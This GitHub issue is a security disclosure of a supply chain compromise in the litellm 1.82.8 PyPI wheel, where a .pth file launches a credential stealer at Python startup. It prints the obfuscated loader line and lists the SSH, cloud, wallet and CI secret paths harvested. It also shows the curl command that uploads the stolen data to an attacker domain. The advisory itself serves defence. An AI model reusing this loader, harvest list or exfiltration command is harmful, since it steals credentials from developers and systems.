---
title: '[Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer · Issue #24512 · BerriAI/litellm · GitHub'
url: https://github.com/BerriAI/litellm/issues/24512
site_name: hnrss
content_file: hnrss-security-critical-malicious-litellm_initpth-in-lit
fetched_at: '2026-03-24T19:28:41.733308'
original_url: https://github.com/BerriAI/litellm/issues/24512
date: '2026-03-24'
description: '[LITELLM TEAM] - For updates from the team, please see: #24518 [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel package on PyPI contains a malicious .p...'
tags:
- hackernews
- hnrss
---

BerriAI



/

litellm

Public

* ### Uh oh!There was an error while loading.Please reload this page.
* NotificationsYou must be signed in to change notification settings
* Fork6.7k
* Star40.2k

# [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer#24512

Open
Open
[Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer
#24512
Labels
llm translation
potential-duplicate

## Description

isfinne
opened
on
Mar 24, 2026
Issue body actions

## [LITELLM TEAM] - For updates from the team, please see:#24518

# [Security]: CRITICAL: Maliciouslitellm_init.pthin litellm 1.82.8 PyPI package — credential stealer

## Summary

Thelitellm==1.82.8wheel package on PyPI contains a malicious.pthfile (litellm_init.pth, 34,628 bytes) thatautomatically executes a credential-stealing script every time the Python interpreter starts— noimport litellmrequired.

This is a supply chain compromise. The malicious file is listed in the package's ownRECORD:

litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628

## Reproduction

pip download litellm==1.82.8 --no-deps -d /tmp/check
python3 -c
"

import zipfile, os

whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]

with zipfile.ZipFile(whl) as z:

 pth = [n for n in z.namelist() if n.endswith('.pth')]

 print('PTH files:', pth)

 for p in pth:

 print(z.read(p)[:300])

"

You will seelitellm_init.pthcontaining:

import

os
,
subprocess
,
sys
;
subprocess
.
Popen
([
sys
.
executable
,
"-c"
,
"import base64; exec(base64.b64decode('...'))"
])

## Malicious Behavior (full analysis)

The payload isdouble base64-encoded. When decoded, it performs the following:

### Stage 1: Information Collection

The script collects sensitive data from the host system:

* System info:hostname,whoami,uname -a,ip addr,ip route
* Environment variables:printenv(captures all API keys, secrets, tokens)
* SSH keys:~/.ssh/id_rsa,~/.ssh/id_ed25519,~/.ssh/id_ecdsa,~/.ssh/id_dsa,~/.ssh/authorized_keys,~/.ssh/known_hosts,~/.ssh/config
* Git credentials:~/.gitconfig,~/.git-credentials
* AWS credentials:~/.aws/credentials,~/.aws/config, IMDS token + security credentials
* Kubernetes secrets:~/.kube/config,/etc/kubernetes/admin.conf,/etc/kubernetes/kubelet.conf,/etc/kubernetes/controller-manager.conf,/etc/kubernetes/scheduler.conf, service account tokens
* GCP credentials:~/.config/gcloud/application_default_credentials.json
* Azure credentials:~/.azure/
* Docker configs:~/.docker/config.json,/kaniko/.docker/config.json,/root/.docker/config.json
* Package manager configs:~/.npmrc,~/.vault-token,~/.netrc,~/.lftprc,~/.msmtprc,~/.my.cnf,~/.pgpass,~/.mongorc.js
* Shell history:~/.bash_history,~/.zsh_history,~/.sh_history,~/.mysql_history,~/.psql_history,~/.rediscli_history
* Crypto wallets:~/.bitcoin/,~/.litecoin/,~/.dogecoin/,~/.zcash/,~/.dashcore/,~/.ripple/,~/.bitmonero/,~/.ethereum/keystore/,~/.cardano/,~/.config/solana/
* SSL/TLS private keys:/etc/ssl/private/, Let's Encrypt.pemand.keyfiles
* CI/CD secrets:terraform.tfvars,.gitlab-ci.yml,.travis.yml,Jenkinsfile,.drone.yml,Anchor.toml,ansible.cfg
* Database credentials: PostgreSQL, MySQL, Redis, LDAP config files
* Webhook URLs: grep for Slack/Discord webhook URLs in env and config files

### Stage 2: Encryption & Exfiltration

1. Collected data is written to a temporary file
2. A random 32-byte AES-256 session key is generated viaopenssl rand
3. The collected data is encrypted withopenssl enc -aes-256-cbc -pbkdf2
4. The AES session key is encrypted with ahardcoded 4096-bit RSA public keyviaopenssl pkeyutl -encrypt -pkeyopt rsa_padding_mode:oaep
5. Both encrypted files are packed intotpcp.tar.gz
6. The archive is exfiltrated via:

curl -s -o /dev/null -X POST \

"
https://models.litellm.cloud/
"
 \
 -H
"
Content-Type: application/octet-stream
"
 \
 -H
"
X-Filename: tpcp.tar.gz
"
 \
 --data-binary @tpcp.tar.gz

## Key Technical Details

* Trigger mechanism:.pthfiles insite-packages/are executed automatically by the Python interpreter on startup (seePython docs on .pth files). Noimportstatement is needed.
* Stealth: The payload is double base64-encoded, making it invisible to naive source code grep.
* Exfiltration target:https://models.litellm.cloud/— note the domainlitellm.cloud(NOTlitellm.ai, the official domain).
* RSA public key(first 64 chars):MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...

## Impact

Anyone who installedlitellm==1.82.8via pip has hadall environment variables, SSH keys, cloud credentials, and other secretscollected and sent to an attacker-controlled server.

This affects:

* Local development machines
* CI/CD pipelines
* Docker containers
* Production servers

## Affected Version

* Confirmed:litellm==1.82.8(PyPI wheellitellm-1.82.8-py3-none-any.whl)
* Other versions: Not yet checked — the attacker may have compromised multiple releases

## Recommended Actions

1. PyPI: Yank/remove litellm 1.82.8 immediately
2. Users: Check forlitellm_init.pthin yoursite-packages/directory
3. Users: Rotate ALL credentials that were present as environment variables or in config files on any system where litellm 1.82.8 was installed
4. BerriAI: Audit PyPI publishing credentials and CI/CD pipeline for compromise

## Environment

* OS: Ubuntu 24.04 (Docker container)
* Python: 3.13
* pip installed from PyPI
* Discovered: 2026-03-24
Reactions are currently unavailable

## Metadata

## Metadata
